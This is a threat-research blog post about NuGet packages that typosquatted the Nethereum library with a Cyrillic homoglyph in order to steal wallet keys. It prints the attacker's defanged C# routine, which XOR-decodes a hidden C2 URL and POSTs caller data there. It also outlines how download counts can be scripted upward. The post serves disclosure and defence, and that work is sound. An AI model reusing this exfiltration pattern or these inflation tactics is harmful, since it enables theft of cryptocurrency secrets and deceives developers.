---
title: "Malicious NuGet Packages Typosquat Nethereum to Exfiltrate Wallet Keys"
short_title: "Malicious NuGet Packages Typosquat Nethereum"
date: 2025-10-22 12:00:00 +0000
categories: [Malware, NuGet]
tags: [NuGet, Typosquatting, Homoglyphs, Obfuscation, .NET, T1195.001, T1036, T1027, T1041, T1204]
description: "The Socket Threat Research Team uncovered malicious NuGet packages typosquatting the popular Nethereum project to steal wallet keys."
toc: true
canonical_url: https://socket.dev/blog/malicious-nuget-packages-typosquat-nethereum-to-exfiltrate-wallet-keys
source: Socket
image:
  path: https://cdn.sanity.io/images/cgdhsj6q/production/1a522c37e553b5718b3c0f8303376eaa975d783c-1024x1024.png?w=1000&q=95&fit=max&auto=format
  alt: Malicious NuGet packages typosquatting Nethereum artwork
---

Socket's Threat Research Team identified a live homoglyph typosquat on NuGet that impersonated the [Nethereum](https://nethereum.com/) project. The package, [`Netherеum.All`](https://socket.dev/search?e=nuget&q=Nether%D0%B5um.All), swaps a Cyrillic "`e`" (`U+0435`) into the name to pass casual inspection, then uses an XOR routine to decode a command and control (C2) endpoint (`solananetworkinstance[.]info/api/gads`). When invoked, the code sends an HTTPS POST with a single field form named `message`, which can carry mnemonics, private keys, keystore JSON, or signed transaction data.

`Nethereum` is the standard .NET library for Ethereum, with tens of [millions](https://www.nuget.org/profiles/nethereum) of NuGet downloads and widespread downstream dependencies, which makes it a high-value target for typosquats on NuGet.

`Netherеum.All` was first published on October 16, 2025. On October 18, 2025, we reported the package and its publisher to the NuGet security team. On October 20, 2025 NuGet removed `Netherеum.All` and suspended the associated publisher account, `nethereumgroup`.

During the investigation we linked this sample to an earlier typosquat, [`NethereumNet`](https://socket.dev/nuget/package/nethereumnet/overview/5.3.3), that used the same exfiltration codebase and had already been taken down by NuGet. Both packages were published by the same threat actor using two NuGet aliases, `nethereumgroup` and `NethereumCsharp`.

![](https://cdn.sanity.io/images/cgdhsj6q/production/634b6336ece06a2aa32e523c18a3fdbf6bf52c34-621x719.png?w=1600&q=95&fit=max&auto=format)

> *Socket AI Scanner's analysis of the malicious [`NethereumNet`](https://socket.dev/nuget/package/nethereumnet/overview/5.3.3) package highlights an XOR-decoded runtime C2, which sends a form field `message` via HTTPS POST and exfiltrates private keys, mnemonics, and other key material. The report notes `Shuffle` is invoked across key constructors, wallet and account initialization, and signing helpers, indicating a supply chain backdoor.*

## The Package That Looks Right Until It Does Not

`Netherеum.All` used a Cyrillic "`e`" (`U+0435`), not a Latin "`e`", so the name read as `Nethereum` at a glance.

Homoglyph abuse varies across registries. NuGet's identifier rules prohibit spaces and unsafe URL characters but do not restrict names to ASCII, which leaves room for Unicode lookalikes. In 2024, Karlo Zanki of ReversingLabs [documented](https://www.reversinglabs.com/blog/malicious-nuget-campaign-uses-homoglyphs-and-il-weaving-to-fool-devs) threat actors abusing homoglyphs on NuGet to impersonate trusted packages. By contrast, most other registries constrain identifiers to ASCII: npm requires lowercase, URL-safe names; PyPI enforces PEP 503 normalization to [`a–z0–9_.-`]; Maven Central limits artifactId to lowercase letters, digits, and hyphens; Crates allows only ASCII in crate names; Go Module paths keep the leading element to lowercase ASCII letters, digits, dots, and dashes; RubyGems accepts letters, numbers, dashes, underscores, and dots.

![](https://cdn.sanity.io/images/cgdhsj6q/production/51ca52be4e3454e777a4fdb990b9a748e6a0d4f4-1172x934.png?w=1600&q=95&fit=max&auto=format)
_Now removed, the NuGet page for Netherеum.All uses a Cyrillic "e" (U+0435) to impersonate Nethereum, a homograph typosquat that looked identical in the title and in the copyable install commands._

Note the package's download counter, which exploded within days of publication, a pattern that is not credible for a new library with no downstream dependents. This strongly indicates automated download inflation.

A threat actor can publish many versions, then script downloads of each `.nupkg` through the v3 flat-container or loop `nuget.exe install` and `dotnet restore` with no-cache options from cloud hosts. Rotating IPs and user agents and parallelizing requests boosts volume while avoiding client caches. Not every request will bypass CDN caching, but pulling many versions at least once inflates the aggregate total. The result is a package that appears "popular", which boosts placement for searches sorted by relevance and lends false sense of proof when developers glance at the numbers.

![](https://cdn.sanity.io/images/cgdhsj6q/production/1f62976862efbe76a2730106b6ff62a39a618783-1159x623.png?w=1600&q=95&fit=max&auto=format)
_NuGet search results show the malicious `Netherеum.All` with 11.6 million total downloads, just days after publication, a hallmark of scripted download inflation._

## Dissecting the Payload

In both samples, the malware's core is in `EIP70221TransactionService.Shuffle`. This method holds the C2 as a 43 character seed, applies a 44 byte position-based XOR mask to derive the URL, then posts a form field `message` with the caller-supplied string to the decoded endpoint.

Below is the threat actor's [code](https://socket.dev/nuget/package/nethereumnet/files/5.3.3/lib/net461/NethereumNet.dll), reused across both `Netherеum.All` and `NethereumNet`, defanged and annotated with inline comments that highlight the malicious behavior.

```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Threading.Tasks;

namespace Nethereum.Accounts
{
    internal class EIP70221TransactionService
    {
        public static async Task Shuffle(string data)
        {
// Seed characters look like "jwwrs:./ronaoanettorkinstance[.]info/api/gads"
// Each character is XORed with a small mask to yield the real URL at runtime
            string u = new string(
                new char[43] { 'j','w','w','r','s',':','.','/',  'r','o','n','a','o','a','n','e','t','t','o','r','k','i','n','s','t','a','n','c','e','.','i','n','f','o','/','a','p','i','/','g','a','d','s' }
                .Select((c, i) => (char)(c ^ new byte[44] { 2,3,3,2,0,0,1,0,1,0,2,0,1,0,0,0,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 }[i]))
                .ToArray()
            );

// Result after XOR: "https://solananetworkinstance[.]info/api/gads"
// Exfiltration: POST form field "message" carrying caller supplied data
            using var cl = new HttpClient();
            await cl.PostAsync(new Uri(u), new FormUrlEncodedContent(new Dictionary<string, string> { ["message"] = data }));
        }
    }
}
```

The package ships wallet and transaction helpers that mirror `Nethereum` namespaces and class shapes. It also references real `Nethereum` libraries such as [`Nethereum.Hex`](https://socket.dev/nuget/package/nethereum.hex), [`Nethereum.Signer`](https://socket.dev/nuget/package/nethereum.signer), [`Nethereum.Util`](https://socket.dev/nuget/package/nethereum.util), and [`Nethereum.RPC`](https://socket.dev/nuget/package/nethereum.rpc), so a normal NuGet restore pulls legitimate dependencies and the application compiles and performs expected Ethereum operations. Nothing runs on install. The beacon fires only when the threat actor's helper executes, specifically `Nethereum.Accounts.EIP70221TransactionService.Shuffle(string)`. That method XOR decodes the on-disk decoy `jwwrs:./ronaoanettorkinstance[.]info/api/gads` into `hxxps://solananetworkinstance[.]info/api/gads`, then sends an HTTPS POST with a single form field, `message`, whose value is exactly the string provided by the caller.

Because this method sits inside a credible transaction service and the surrounding library does real work, a developer can see the app function normally while sensitive strings quietly leave the process. Routine flows such as importing a mnemonic, decrypting a keystore, preparing or signing a transaction, or passing serialized transaction blobs can route data through this path. If `Shuffle` is reached directly or indirectly, that secret becomes the `message` payload to the decoded C2.

## Outlook and Recommendations

Typosquats that look legitimate, inflated download counts, and a tiny XOR routine hiding a hardcoded C2 can bypass casual review and exfiltrate secrets from developer workstations and CI runners.

This campaign actively probed NuGet for crypto secrets. The threat actor published a malicious typosquat, `NethereumNet`, in early October 2025, then a homoglyph typosquat, `Netherеum.All` (with a Cyrillic "`е`"), in mid-October. Both reused the same playbook: deceptive naming, manufactured trust via inflated downloads, and a minimal XOR decode to a fixed C2.

Socket's AI scanner flagged the packages; manual analysis confirmed exfiltration. We reported the live sample on October 18, 2025; NuGet removed `Netherеum.All` and suspended the publisher on October 20, 2025. That leaves roughly four days of dwell time between publication and takedown, which is more than enough for damage if a victim passed mnemonics, private keys, keystore passwords, or signed transactions through the malicious path. Registry removal does not clean environments; treat exposed secrets as compromised and rotate them.

Expect reattempts with rotated domains, deeper obfuscation, and potentially install-time execution (e.g., module initializers, MSBuild targets).

Defenders should tighten dependency hygiene; verify publisher identity; scan dependency changes pre-merge and at install; monitor for anomalous network egress; and alert on homoglyphs, sudden download spikes, and small decode-and-exfil routines.

Socket is purpose-built to detect and stop these types of attacks before they reach developers or CI environments. Socket's capabilities extend to [securing .NET applications](https://socket.dev/blog/introducing-net-support), ensuring consistent protection across more than a dozen ecosystems without slowing development.

Use the [Socket GitHub App](https://socket.dev/features/github) to scan PRs for dependency changes and block risky behavior (install scripts, unexpected egress, native code) before merge. Pair it with the [Socket CLI](https://socket.dev/features/cli) to enforce allow/deny rules during installs, and add [Socket MCP](https://socket.dev/blog/socket-mcp) to catch malicious or hallucinated packages introduced via AI code suggestions.

Harden install-time defenses with [Socket Firewall](https://socket.dev/blog/introducing-socket-firewall), which mediates dependency requests and blocks known-malicious packages (including transitives) before the package manager fetches them. For developer awareness while browsing registries, enable the [Socket browser extension](https://chromewebstore.google.com/detail/socket-security/jbcobpbfgkhmjfpjjepkcocalmpkiaop?pli=1).

## MITRE ATT&CK

- T1195.001 — Supply Chain Compromise: Compromise Software Dependencies and Development Tools
- T1036 — Masquerading
- T1027 — Obfuscated Files or Information
- T1041 — Exfiltration Over C2 Channel
- T1204 — User Execution

## Indicators of Compromise (IOCs)

### Malicious Packages

- [`Netherеum.All`](https://socket.dev/search?e=nuget&q=Nether%D0%B5um.All)
- [`NethereumNet`](https://socket.dev/nuget/package/nethereumnet/overview/5.3.3)

### Threat Actor's NuGet Aliases

- `nethereumgroup`
- `NethereumCsharp`

### C2 Endpoint

- `solananetworkinstance[.]info/api/gads`
